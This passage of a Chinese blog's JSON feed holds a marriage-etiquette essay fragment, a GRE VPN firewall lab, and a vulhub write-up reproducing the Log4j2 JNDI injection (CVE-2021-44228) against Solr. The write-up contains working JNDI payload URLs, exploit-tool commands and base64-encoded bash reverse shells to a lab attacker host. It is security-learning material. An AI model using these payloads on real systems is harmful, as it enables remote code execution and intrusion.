title=\"细微之处见真情\"></a>细微之处见真情</h3><p>很多男人总是不注意日常生活中的一些小事，因为他们不知道这些小事能够体现出他们对女人的体贴，而往往爱的远进，都是从一些细微的地方开始的。</p>\n<p>为什么一定要等到你的妻子生病住院了，你才给她买花呢？为什么不在明天晚上就买一束玫瑰花送给她呢？如果你愿意的话，不立即去做，看看结果会如何</p>\n<p>婚姻是由一连串的项事组成的，如果忽略了这个事实的话，就将会造成家庭生活的灾难。</p>\n<h3 id=\"家庭内部也应有礼\"><a href=\"#家庭内部也应有礼\" class=\"headerlink\" title=\"家庭内部也应有礼\"></a>家庭内部也应有礼</h3><p>礼貌是一种品质，它可以弥补服饰和外在的缺陷。</p>\n<p>在个人的幸福快乐方面，婚姻要比世界更加重要，更加切身。</p>\n<p>不讲道理就像是吞爱情的癌细胞。我们每个人都知道这一点，但并不是每个人都能做到。大多情况下我们对待自的家人， 却不及对待陌生人那样有礼貌</p>\n",
            "tags": []
        },
        {
            "id": "https://w-sqrt7.github.io/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/",
            "url": "https://w-sqrt7.github.io/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/",
            "title": "GRE VPN配置",
            "date_published": "2024-05-27T10:23:30.862Z",
            "content_html": "<h1 id=\"GRE-VPN配置\"><a href=\"#GRE-VPN配置\" class=\"headerlink\" title=\"GRE VPN配置\"></a>GRE VPN配置</h1><h2 id=\"实验拓扑图：\"><a href=\"#实验拓扑图：\" class=\"headerlink\" title=\"实验拓扑图：\"></a>实验拓扑图：</h2><p><img src=\"/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/image-20240527183724828.png\" alt=\"image-20240527183724828\"></p>\n<h2 id=\"实验过程：\"><a href=\"#实验过程：\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.首先配置pc的ip子网掩码和网关</p>\n<p>2.然后开始对防火墙进行配置，配端口ip</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]int g1/0/0</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]ip address 192.168.0.254 24</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[FW1]int g1/0/1</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]ip address 202.0.0.1 24</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure>\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2]int g1/0/0</span><br><span class=\"line\">[FW2-GigabitEthernet1/0/0]ip address 192.168.1.254 24</span><br><span class=\"line\">[FW2-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[FW2]int g1/0/1</span><br><span class=\"line\">[FW2-GigabitEthernet1/0/1]ip address 202.0.0.2 24</span><br><span class=\"line\">[FW2-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>这里开始把tunnel隧道也配置好</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]int Tunnel 0</span><br><span class=\"line\">[FW1-Tunnel0]ip address 172.16.10.1 24</span><br><span class=\"line\">[FW1-Tunnel0]tunnel-protocol gre</span><br><span class=\"line\">[FW1-Tunnel0]source 202.0.0.1</span><br><span class=\"line\">[FW1-Tunnel0]destination 202.0.0.2</span><br><span class=\"line\">[FW1-Tunnel0]quit</span><br></pre></td></tr></table></figure>\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2]int Tunnel 0</span><br><span class=\"line\">[FW2-Tunnel0]ip address 172.16.10.2 24</span><br><span class=\"line\">[FW2-Tunnel0]tunnel-protocol gre</span><br><span class=\"line\">[FW2-Tunnel0]source 202.0.0.2</span><br><span class=\"line\">[FW2-Tunnel0]destination 202.0.0.1</span><br><span class=\"line\">[FW2-Tunnel0]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>然后配置安全区域</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]firewall zone trust </span><br><span class=\"line\">[FW1-zone-trust]add interface g1/0/0</span><br><span class=\"line\">[FW1-zone-trust]quit</span><br><span class=\"line\">[FW1]firewall zone untrust </span><br><span class=\"line\">[FW1-zone-untrust]add interface g1/0/1</span><br><span class=\"line\">[FW1-zone-untrust]quit</span><br><span class=\"line\"></span><br><span class=\"line\">[FW1]firewall zone dmz </span><br><span class=\"line\">[FW1-zone-dmz]add interface Tunnel 0</span><br><span class=\"line\">[FW1-zone-dmz]quit</span><br></pre></td></tr></table></figure>\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2]firewall zone trust </span><br><span class=\"line\">[FW2-zone-trust]add interface g1/0/0</span><br><span class=\"line\">[FW2-zone-trust]quit</span><br><span class=\"line\">[FW2]firewall zone untrust </span><br><span class=\"line\">[FW2-zone-untrust]add interface g1/0/1</span><br><span class=\"line\">[FW2-zone-untrust]quit</span><br><span class=\"line\"></span><br><span class=\"line\">[FW2]firewall zone dmz </span><br><span class=\"line\">[FW2-zone-dmz]add interface Tunnel 0</span><br><span class=\"line\">[FW2-zone-dmz]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>然后配置防火墙的静态路由</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]ip route-static 192.168.1.0 24 Tunnel 0</span><br></pre></td></tr></table></figure>\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2]ip route-static 192.168.0.0 24 Tunnel 0</span><br></pre></td></tr></table></figure>\n\n\n\n<p>最后就是配置三条安全策略</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1-policy-security]display this</span><br><span class=\"line\">2024-05-27 11:10:27.880 </span><br><span class=\"line\">#</span><br><span class=\"line\">security-policy</span><br><span class=\"line\"> rule name gre1</span><br><span class=\"line\">  source-zone trust</span><br><span class=\"line\">  destination-zone dmz</span><br><span class=\"line\">  source-address 192.168.0.0 mask 255.255.255.0</span><br><span class=\"line\">  destination-address 192.168.1.0 mask 255.255.255.0</span><br><span class=\"line\">  action permit</span><br><span class=\"line\"> rule name gre2</span><br><span class=\"line\">  source-zone dmz</span><br><span class=\"line\">  destination-zone trust</span><br><span class=\"line\">  source-address 192.168.1.0 mask 255.255.255.0</span><br><span class=\"line\">  destination-address 192.168.0.0 mask 255.255.255.0</span><br><span class=\"line\">  action permit</span><br><span class=\"line\"> rule name gre3</span><br><span class=\"line\">  source-zone local</span><br><span class=\"line\">  source-zone untrust</span><br><span class=\"line\">  destination-zone local</span><br><span class=\"line\">  destination-zone untrust</span><br><span class=\"line\">  service gre</span><br><span class=\"line\">  action permit</span><br><span class=\"line\">#</span><br><span class=\"line\">return</span><br></pre></td></tr></table></figure>\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2-policy-security]display this</span><br><span class=\"line\">2024-05-27 11:14:21.890 </span><br><span class=\"line\">#</span><br><span class=\"line\">security-policy</span><br><span class=\"line\"> rule name gre1</span><br><span class=\"line\">  source-zone trust</span><br><span class=\"line\">  destination-zone dmz</span><br><span class=\"line\">  source-address 192.168.1.0 mask 255.255.255.0</span><br><span class=\"line\">  destination-address 192.168.0.0 mask 255.255.255.0</span><br><span class=\"line\">  action permit</span><br><span class=\"line\"> rule name gre2</span><br><span class=\"line\">  source-zone dmz</span><br><span class=\"line\">  destination-zone trust</span><br><span class=\"line\">  source-address 192.168.0.0 mask 255.255.255.0</span><br><span class=\"line\">  destination-address 192.168.1.0 mask 255.255.255.0</span><br><span class=\"line\">  action permit</span><br><span class=\"line\"> rule name gre3</span><br><span class=\"line\">  source-zone local</span><br><span class=\"line\">  source-zone untrust</span><br><span class=\"line\">  destination-zone local</span><br><span class=\"line\">  destination-zone untrust</span><br><span class=\"line\">  service gre</span><br><span class=\"line\">  action permit</span><br><span class=\"line\">#</span><br><span class=\"line\">return</span><br></pre></td></tr></table></figure>\n\n<p>至此便完成了GRE VPN的配置，然后进行测试，不同内网中的主机是可以相互通信的，同样可以wireshark抓包进行查看</p>\n<p><img src=\"/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/image-20240527191751145.png\" alt=\"image-20240527191751145\"></p>\n<p><img src=\"/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/Screenshot_20240603_205336_net.csdn.csdnplus.jpg\" alt=\"Screenshot_20240603_205336_net.csdn.csdnplus\"></p>\n",
            "tags": [
                "原创",
                "网基",
                "eNSP"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.github.io/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】Log4j2漏洞复现",
            "date_published": "2024-05-26T03:14:31.558Z",
            "content_html": "<h1 id=\"【vulhub】Log4j2漏洞复现\"><a href=\"#【vulhub】Log4j2漏洞复现\" class=\"headerlink\" title=\"【vulhub】Log4j2漏洞复现\"></a>【vulhub】Log4j2漏洞复现</h1><h2 id=\"log4j2\"><a href=\"#log4j2\" class=\"headerlink\" title=\"log4j2\"></a>log4j2</h2><p>log4j是Apache的一个开源项目，是一个基于Java的日志记录框架。Log4j2是log4j的后继者，被大量用于业务系统开发，记录日志信息。</p>\n<p>log4j2 中存在JNDI注入漏洞，Log4j2 组件在开启了日志记录功能后，凡是在可触发错误记录日志的地方，插入漏洞利用代码，即可利用成功。特殊情况下，若该组件记录的日志包含其他系统的记录日志，则有可能造成间接投毒。通过中间系统，使得组件间接读取了具有攻击性的漏洞利用代码，亦可间接造成漏洞触发。</p>\n<p>同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，例如 Apache Struts2、Apache Solr、Apache Druid、Apache Flink、Tomcat、Weblogic、ES、Redis等</p>\n<h2 id=\"JNDI\"><a href=\"#JNDI\" class=\"headerlink\" title=\"JNDI\"></a>JNDI</h2><p>JNDI 是 Java Naming and Directory Interface 的缩写，是 Java 中用于访问各种命名和目录服务的API（应用程序编程接口）。JNDI 提供了一种标准的方式来访问各种命名和目录服务，相当于一个用于映射的字典，从指定的远程服务器获取并加载对象，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>\n<p>其中常用的协议包括 RMI（远程方法调用）和 LDAP（轻量目录访问协议）。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务，以LDAP服务为例进行复现。</p>\n<h2 id=\"lookup：\"><a href=\"#lookup：\" class=\"headerlink\" title=\"lookup：\"></a>lookup：</h2><p>log4j2框架下的lookup查询服务是一种查找机制，用于动态获取和替换日志记录中的变量或属性的值，提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。</p>\n<p>攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，jdk将从url指定的路径下载一段字节流，并将其反序列化为Java对象，作为jndi返回。反序列化过程中，即会执行字节流中包含的程序，造成了远程代码执行。</p>\n<p>log4j中除了sys解析器外，还有很多其他类型的解析器。其中，jndi 解析器就是本次漏洞的源头。</p>\n<h2 id=\"LDAP：\"><a href=\"#LDAP：\" class=\"headerlink\" title=\"LDAP：\"></a>LDAP：</h2><p>LDAP(轻型目录访问协议)是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。</p>\n<h2 id=\"RMI：\"><a href=\"#RMI：\" class=\"headerlink\" title=\"RMI：\"></a>RMI：</h2><p>RMI（远程方法调用）：它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。</p>\n<h2 id=\"漏洞环境\"><a href=\"#漏洞环境\" class=\"headerlink\" title=\"漏洞环境\"></a>漏洞环境</h2><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p>\n<p>如一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p>\n<p><strong>影响版本</strong></p>\n<p>Apache Log4j 2.x &lt;&#x3D; 2.14.1 &lt;&#x3D; Log4j 2.15.0-rc1</p>\n<h1 id=\"CVE-2021-44228\"><a href=\"#CVE-2021-44228\" class=\"headerlink\" title=\"CVE-2021-44228\"></a>CVE-2021-44228</h1><h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>攻击者构造payload，在JNDI接口lookup查询进行注入，payload为${jndi:ldap:恶意url&#x2F;poc}，JNDI会去对应的服务（如LDAP、RMI、DNS、文件系统、目录服务…）查找资源，由于lookup的出栈没做限制，最终指向了攻击者部署好的恶意站点，下载了远程的恶意class，最终造成了远程代码执行rce。</p>\n<p><strong>详细过程分析：</strong></p>\n<p>log4j2 框架下的 lookup 查询服务提供了 {} 字段解析功能，传进去的值会被直接解析。</p>\n<p>当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中</p>\n<p><strong>RMI</strong></p>\n<blockquote>\n<p>假如日志中含有该语句${jndi:&#x2F;&#x2F;rmi:服务器地址&#x2F;Exploit}</p>\n<p>被攻击服务器发现要输出的信息中有 ${}，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMI，而后根据RMI服务器地址去请求Exploit。</p>\n<p>RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类），而该Reference指定了远端文件下载服务器上含有恶意代码的class文件。</p>\n<p>被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。</p>\n<p>被攻击服务器下载恶意class文件并执行其中的恶意代码。</p>\n</blockquote>\n<p><strong>LDAP</strong></p>\n<blockquote>\n<p>假如日志中含有该语句${jndi:ldap:192.168.100.131:5555&#x2F;exp}</p>\n<p>被攻击服务器发现要输出的信息中有 ${}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099&#x2F;exp</p>\n<p>解析到ldap，就会去192.168.61.129:1099的ldap服务找名为exp的资源，如果找不到就会去http服务中找，在http中找到exp之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现exp是一个.class文件，就会去执行里面的代码，从而实现注入攻击者就可以通过shell实现任意的命令执行，造成严重危害</p>\n</blockquote>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-26%20124201.png\" alt=\"屏幕截图 2024-05-26 124201\"></p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>首先要找到注入点，尝试传入参数，&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;</p>\n<p>利用DNSlog平台进行漏洞验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://xyzq33.dnslog.cn&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xyzq33.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526163239058.png\" alt=\"image-20240526163239058\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526163300422.png\" alt=\"image-20240526163300422\"></p>\n<p>可以发现回显验证成功，即存在漏洞，然后尝试进行漏洞利用，获取shell。</p>\n<h3 id=\"法一：JNDI注入工具\"><a href=\"#法一：JNDI注入工具\" class=\"headerlink\" title=\"法一：JNDI注入工具\"></a>法一：JNDI注入工具</h3><p><strong>工具一：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</strong></p>\n<p>在攻击机上nc开启端口监听，等待shell反弹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 6666</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526164651028.png\" alt=\"image-20240526164651028\"></p>\n<p>利用JNDI注入工具，开启相对应的LDAP或RMI服务，-A为开启LDAP服务的服务器ip，这里我用的是攻击机的IP，即模拟kali不仅是LDAP服务器，也是用于反弹获取shell的服务器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,[经过base64编码后的命令]&#125;|&#123;base64,-d&#125;|bash&quot; -A [vps ip]</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.100.131/6666 0&gt;&amp;1</span><br><span class=\"line\">base64编码后:YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot; -A 192.168.100.131</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-26%20165326.png\" alt=\"屏幕截图 2024-05-26 165326\"></p>\n<p>根据上方工具生成的进行payload构造并请求，可以获取到shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/hk5uoj&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165653255.png\" alt=\"image-20240526165653255\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165835051.png\" alt=\"image-20240526165835051\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165912073.png\" alt=\"image-20240526165912073\"></p>\n<p><strong>工具二：JNDIExploit-1.4-SNAPSHOT.jar</strong></p>\n<p>攻击机同样需要先开启nc监听端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 7777</span><br></pre></td></tr></table></figure>\n\n<p>然后使用工具开启LDAP服务，-i 后面加上对应的ip，可-h查看具体用法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.100.131</span><br></pre></td></tr></table></figure>\n\n<p>构造payload并请求，将shell反弹到攻击机对应ip和端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/Basic/ReverseShell/192.168.100.131/7777&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526170913873.png\" alt=\"image-20240526170913873\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526170948245.png\" alt=\"image-20240526170948245\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526171004217.png\" alt=\"image-20240526171004217\"></p>\n<h3 id=\"法二：编写恶意文件\"><a href=\"#法二：编写恶意文件\" class=\"headerlink\" title=\"法二：编写恶意文件\"></a>法二：编写恶意文件</h3><p>首先编写bash命令，并开启nc监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 8888</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.100.131/8888 0&gt;&amp;1</span><br><span class=\"line\">base64编码后：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx</span><br><span class=\"line\"></span><br><span class=\"line\">bash：启动Bash shell。</span><br><span class=\"line\">-i：使Bash以交互式模式运行，这通常意味着它会读取用户输入。</span><br><span class=\"line\">&gt;&amp; /dev/tcp/192.168.100.131/8888：这是一个Bash重定向技巧。它将Bash的标准输出（文件描述符1）和标准错误（文件描述符2，由于在此处未明确指定，所以它会跟随标准输出）都重定向到/dev/tcp/192.168.100.131/8888。</span><br><span class=\"line\">/dev/tcp/host/port是某些Unix系统（如Linux）上提供的一种特殊文件，它允许你通过该文件描述符与远程TCP主机和端口进行通信。</span><br><span class=\"line\">在这个例子中，Bash shell尝试连接到IP地址192.168.100.131的8888端口，并将所有输出发送到那里。</span><br><span class=\"line\">0&gt;&amp;1：这是另一个重定向。它将Bash的标准输入（文件描述符0）重定向到之前设置的标准输出（文件描述符1）。由于我们已经将标准输出重定向到/dev/tcp/192.168.100.131/8888，所以这也意味着Bash的标准输入现在来自该TCP连接。</span><br><span class=\"line\"></span><br><span class=\"line\">文件描述符：</span><br><span class=\"line\">0 通常代表标准输入（stdin）</span><br><span class=\"line\">1 通常代表标准输出（stdout）</span><br><span class=\"line\">2 通常代表标准错误（stderr）</span><br><span class=\"line\">&gt;&amp;：</span><br><span class=\"line\">这是一个重定向操作符，它将一个文件描述符重定向到另一个文件描述符。具体来说，它将左边的文件描述符指向右边文件描述符所指向的位置。</span><br><span class=\"line\">0&gt;&amp;1：</span><br><span class=\"line\">这意味着将标准输入（stdin，文件描述符 0）重定向到标准输出（stdout，文件描述符 1）当前所指向的位置。</span><br><span class=\"line\"></span><br><span class=\"line\">所以，整个命令的效果是：启动一个交互式Bash shell，将其标准输入、输出和错误都重定向到与192.168.100.131的8888端口的TCP连接。这允许攻击者（或测试人员）在远程系统上执行命令，并通过TCP连接查看输出。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">bash -c：这告诉bash执行一个由-c选项后面跟随的字符串指定的命令。</span><br><span class=\"line\">|&#123;base64,-d&#125;|：这部分试图使用管道（|）将前面的输出传递给base64 -d命令进行解码。但</span><br><span class=\"line\">&#123;bash,-i&#125;：再次运行bash，但带有-i选项（交互式），</span><br></pre></td></tr></table></figure>\n\n<p>编写恶意文件，命名为Exploit.java</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span 